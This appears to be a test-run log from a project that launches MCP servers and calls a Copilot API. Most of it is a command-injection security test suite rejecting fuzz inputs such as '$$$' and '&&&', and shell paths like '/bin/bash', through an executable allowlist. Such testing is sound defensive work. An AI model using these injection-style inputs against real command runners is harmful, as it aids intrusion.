aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa","allowedExecutables":["node","node.exe","python","python.exe","python3","python3.exe","npx","npx.cmd","deno","deno.exe","bun","bun.exe"]}

[90mstdout[2m | tests/security-command-injection.test.ts[2m > [22m[2mCommand Injection Security Tests[2m > [22m[2mEdge Cases and Fuzzing[2m > [22m[2mshould handle command with only special characters[22m[39m
2026-02-12T17:11:35.891Z [[33mwarn[39m]: MCP executable rejected by allowlist {"userId":1,"command":"!!!","basename":"!!!","allowedExecutables":["node","node.exe","python","python.exe","python3","python3.exe","npx","npx.cmd","deno","deno.exe","bun","bun.exe"]}
2026-02-12T17:11:35.892Z [[33mwarn[39m]: MCP executable rejected by allowlist {"userId":1,"command":"@@@","basename":"@@@","allowedExecutables":["node","node.exe","python","python.exe","python3","python3.exe","npx","npx.cmd","deno","deno.exe","bun","bun.exe"]}
2026-02-12T17:11:35.893Z [[33mwarn[39m]: MCP executable rejected by allowlist {"userId":1,"command":"###","basename":"###","allowedExecutables":["node","node.exe","python","python.exe","python3","python3.exe","npx","npx.cmd","deno","deno.exe","bun","bun.exe"]}
2026-02-12T17:11:35.893Z [[33mwarn[39m]: MCP executable rejected due to dangerous characters {"userId":1,"command":"$$$"}
2026-02-12T17:11:35.894Z [[33mwarn[39m]: MCP executable rejected by allowlist {"userId":1,"command":"%%%","basename":"%%%","allowedExecutables":["node","node.exe","python","python.exe","python3","python3.exe","npx","npx.cmd","deno","deno.exe","bun","bun.exe"]}
2026-02-12T17:11:35.895Z [[33mwarn[39m]: MCP executable rejected by allowlist {"userId":1,"command":"^^^","basename":"^^^","allowedExecutables":["node","node.exe","python","python.exe","python3","python3.exe","npx","npx.cmd","deno","deno.exe","bun","bun.exe"]}
2026-02-12T17:11:35.895Z [[33mwarn[39m]: MCP executable rejected due to dangerous characters {"userId":1,"command":"&&&"}
2026-02-12T17:11:35.896Z [[33mwarn[39m]: MCP executable rejected by allowlist {"userId":1,"command":"***","basename":"***","allowedExecutables":["node","node.exe","python","python.exe","python3","python3.exe","npx","npx.cmd","deno","deno.exe","bun","bun.exe"]}

[90mstdout[2m | tests/security-command-injection.test.ts[2m > [22m[2mCommand Injection Security Tests[2m > [22m[2mEdge Cases and Fuzzing[2m > [22m[2mshould handle Unicode in command names[22m[39m
2026-02-12T17:11:35.899Z [[33mwarn[39m]: MCP executable rejected by allowlist {"userId":1,"command":"nÂ­Æ’Ã¿Ãªde","basename":"nÂ­Æ’Ã¿Ãªde","allowedExecutables":["node","node.exe","python","python.exe","python3","python3.exe","npx","npx.cmd","deno","deno.exe","bun","bun.exe"]}

[90mstdout[2m | tests/security-command-injection.test.ts[2m > [22m[2mCommand Injection Security Tests[2m > [22m[2mEdge Cases and Fuzzing[2m > [22m[2mshould handle mixed case and variations[22m[39m
2026-02-12T17:11:35.902Z [[32minfo[39m]: MCP server added {"userId":1,"serverName":"case-variant","serverType":"stdio"}

[90mstdout[2m | tests/security-command-injection.test.ts[2m > [22m[2mCommand Injection Security Tests[2m > [22m[2mHTTP Server Security[2m > [22m[2mshould accept valid https URL[22m[39m
2026-02-12T17:11:35.908Z [[32minfo[39m]: MCP server added {"userId":1,"serverName":"https-server","serverType":"http"}

 [31mÃ”Ã˜Â»[39m tests/security-command-injection.test.ts [2m ([22m[2m55 tests[22m [2m|[22m [31m6 failed[39m[2m)[22m[90m 255[2mms[22m[39m
[31m   [31mâ”œÃ¹[31m Command Injection Security Tests[2m > [22mExecutables Outside Allowlist[2m > [22mshould reject executable with full path outside allowlist[39m
[31m     Ã”Ã¥Ã† expected 'Ã”Ã˜Ã® La ruta absoluta \'/bin/bash\' no eÃ”Ã‡Âª' to contain 'no permitido'[39m
[31m   [31mâ”œÃ¹[31m Command Injection Security Tests[2m > [22mPath Traversal in Executable Path[2m > [22mshould reject command with absolute path to system binary[39m
[31m     Ã”Ã¥Ã† expected 'Ã”Ã˜Ã® La ruta absoluta \'C:\Windows\SysteÃ”Ã‡Âª' to contain 'no permitido'[39m
[31m   [31mâ”œÃ¹[31m Command Injection Security Tests[2m > [22mPath Traversal in Executable Path[2m > [22mshould extract basename correctly from full path[39m
[31m     Ã”Ã¥Ã† expected false to be true // Object.is equality[39m
[31m   [31mâ”œÃ¹[31m Command Injection Security Tests[2m > [22mPath Traversal in Executable Path[2m > [22mshould handle Windows paths correctly[39m
[31m     Ã”Ã¥Ã† expected false to be true // Object.is equality[39m
[31m   [31mâ”œÃ¹[31m Command Injection Security Tests[2m > [22mEdge Cases and Fuzzing[2m > [22mshould handle mixed case and variations[39m
[31m     Ã”Ã¥Ã† expected false to be true // Object.is equality[39m
[31m   [31mâ”œÃ¹[31m Command Injection Security Tests[2m > [22mHTTP Server Security[2m > [22mshould accept valid http URL[39m
[31m     Ã”Ã¥Ã† expected false to be true // Object.is equality[39m
[90mstdout[2m | tests/message-handler.test.ts[2m > [22m[2mHeartbeat functionality[2m > [22m[2mshould send multiple heartbeat warnings at UPDATE_INTERVAL[22m[39m
2026-02-12T17:11:35.924Z [[32minfo[39m]: Starting Copilot API call {"chatId":"456","userId":"user123","promptLength":11,"prompt":"test prompt","hasAbortSignal":false}

[90mstdout[2m | tests/message-handler.test.ts[2m > [22m[2mHeartbeat functionality[2m > [22m[2mshould send multiple heartbeat warnings at UPDATE_INTERVAL[22m[39m
2026-02-12T17:11:56.024Z [[32minfo[39m]: Operation completed with enhanced stats {"chatId":"456","userId":"user123","elapsedMs":20100,"autoExtensionCount":0,"manualExtensions":0,"totalExtensions":0,"totalExtensionMs":0}

[90mstdout[2m | tests/message-handler.test.ts[2m > [22m[2mHeartbeat functionality[2m > [22m[2mshould stop heartbeat warnings when events resume[22m[39m
2026-02-12T17:11:36.060Z [[32minfo[39m]: Starting Copilot API call {"chatId":"456","userId":"user123","promptLength":11,"prompt":"test prompt","hasAbortSignal":false}

[90mstdout[2m | tests/message-handler.test.ts[2m > [22m[2mHeartbeat functionality[2m > [22m[2mshould stop heartbeat warnings when events resume[22m[39m
2026-02-12T17:11:56.260Z [[32minfo[39m]: Operation completed with enhanced stats {"chatId":"456","userId":"user123","elapsedMs":20200,"autoExtensionCount":0,"manualExtensions":0,"totalExtensions":0,"totalExtensionMs":0}

[90mstdout[2m | tests/message-handler.test.ts[2m > [22m[2mHeartbeat functionality[2m > [22m[2mshould stop heartbeat warnings on session.idle[22m[39m
2026-02-12T17:11:36.136Z [[32minfo[39m]: Starting Copilot API call {"chatId":"456","userId":"user123","promptLength":11,"prompt":"test prompt","hasAbortSignal":false}

[90mstdout[2m | tests/message-handler.test.ts[2m > [22m[2mHeartbeat functionality[2m > [22m[2mshould stop heartbeat warnings on session.idle[22m[39m
2026-02-12T17:11:46.236Z [[32minfo[39m]: Operation completed with enhanced stats {"chatId":"456","userId":"user123","elapsedMs":10100,"autoExtensionCount":0,"manualExtensions":0,"totalExtensions":0,"totalExtensionMs":0}

[90mstdout[2m | tests/message-handler.test.ts[2m > [22m[2mHeartbeat functionality[2m > [22m[2mshould format elapsed time correctly in heartbeat message[22m[39m
2026-02-12T17:11:36.206Z [[32minfo[39m]: Starting Copilot API call {"chatId":"456","userId":"user123","promptLength":11,"prompt":"test prompt","hasAbortSignal":false}

[90mstdout[2m | tests/message-handler.test.ts[2m > [22m[2mHeartbeat functionality[2m > [22m[2mshould format elapsed time correctly in heartbeat message[22m[39m
2026-02-12T17:15:01.306Z [[32minfo[39m]: Operation completed with enhanced stats {"chatId":"456","userId":"user123","elapsedMs":205100,"autoExtensionCount":0,"manualExtensions":0,"totalExtensions":0,"totalExtensionMs":0}

[90mstdout[2m | tests/auto-extension.test.ts[2m > [22m[2mAuto-Extension Logic[2m > [22m[2mAuto-extension cancellation checks[2m > [22m[2mshould NOT auto-extend if operation is cancelled[22m[39m
2026-02-12T17:11:36.279Z [[32minfo[39m]: Creating new session {"userId":"user123","projectPath":"C:\\temp","model":"claude-sonnet-4.5","toolsCount":0,"mcpServersCount":0,"hasSystemMessage":false}
2026-02-12T17:11:36.279Z [[32minfo[39m]: Session created successfully {"userId":"user123","projectPath":"C:\\temp","sessionCount":1}

[90mstdout[2m | tests/message-handler.test.ts[2m > [22m[2mHeartbeat functionality[2m > [22m[2mshould NOT reject after session.idle even if global timeout fires (race condition fix)[22m[39m
2026-02-12T17:11:36.305Z [[32minfo[39m]: Starting Copilot API call {"chatId":"456","userId":"user123","promptLength":11,"prompt":"test prompt","hasAbortSignal":false}

[90mstdout[2m | tests/message-handler.test.ts[2m > [22m[2mHeartbeat functionality[2m > [22m[2mshould NOT reject after session.idle even if global timeout fires (race condition fix)[22m[39m
2026-02-12T17:11:36.355Z [[32minfo[39m]: Operation completed with enhanced stats {"chatId":"456","userId":"user123","elapsedMs":50,"autoExtensionCount":0,"manualExtensions":0,"totalExtensions":0,"totalExtensionMs":0}

[90mstdout[2m | tests/message-handler.test.ts[2m > [22m[2mMessageHandler[2m > [22m[2mshould send initial status message with correct emoji and text[22m[39m
2026-02-12T17:11:36.444Z [[32minfo[39m]: Starting Copilot API call {"chatId":"456","userId":"user123","promptLength":11,"prompt":"test prompt","hasAbortSignal":false}

[90mstdout[2m | tests/message-handler.test.ts[2m > [22m[2mMessageHandler[2m > [22m[2mshould send initial status message with correct emoji and text[22m[39m
2026-02-12T17:11:36.448Z [[32minfo[39m]: Operation completed with enhanced stats {"chatId":"456","userId":"user123","elapsedMs":4,"autoExtensionCount":0,"manualExtensions":0,"totalExtensions":0,"totalExtensionMs":0}

 [31mÃ”Ã˜Â»[39m tests/auto-extension.test.ts [2m ([22m[2m13 tests[22m [2m|[22m [31m1 failed[39m[2m)[22m[33m 5757[2mms[22m[39m
[31m   [31mâ”œÃ¹[31m Auto-Extension Logic[2m > [22mAuto-extension triggers at 70% of timeout[2m > [22mshould trigger auto-extension at 70% of initial timeout with recent activity[39m
[31m     Ã”Ã¥Ã† Test timed out in 5000ms.
If this is a long-running test, pass a timeout value as the last argument or configure it globally with "testTimeout".[39m
